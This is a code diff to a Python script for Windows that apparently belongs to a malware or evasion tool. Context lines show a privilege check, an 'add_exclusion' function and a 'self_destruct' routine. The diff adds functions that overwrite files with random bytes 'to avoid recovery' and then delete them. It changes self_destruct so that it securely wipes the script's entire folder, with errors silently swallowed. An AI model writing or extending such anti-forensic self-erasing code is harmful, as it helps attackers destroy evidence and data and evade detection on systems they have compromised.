@@ -2,6 +2,7 @@ import ctypes.wintypes
 import subprocess
 import os
 import ctypes
+import shutil
 
 def is_admin():
     """ check for privilege """
@@ -27,13 +28,37 @@ def add_exclusion():
     except Exception as e:
         pass
 
+def wipe_file(file_path, passes=1):
+    """ Write random bytes multiple times to avoid recovery """
+    try:
+        with open(file_path, "r+b") as file:
+            length = os.path.getsize(file_path)
+            for i in range(passes):
+                file.seek(0)
+                file.write(os.urandom(length))
+    except:
+        return False
+    
+def delete_folder(folder_path):
+    """ Removes whole folder containing program """
+    try:
+        for root, dirs, files in os.walk(folder_path, topdown=False):
+            for name in files:
+                file_path = os.path.join(root, name)
+                wipe_file(file_path, passes=1)
+        shutil.rmtree(folder_path)
+    except:
+        return False
+
 def self_destruct():
     """ destroy self """
     try:
-        current_pwd = os.path.realpath(__file__)
-        os.remove(current_pwd)
+        # current_pwd = os.path.realpath(__file__)
+        current_pwd = os.path.dirname(os.path.realpath(__file__))
+        # os.remove(current_pwd)
+        delete_folder(current_pwd)
     except:
-        pass
+        return False
 
 def display_message(message, title="Notification", box_type="info"):
     """ display info box """
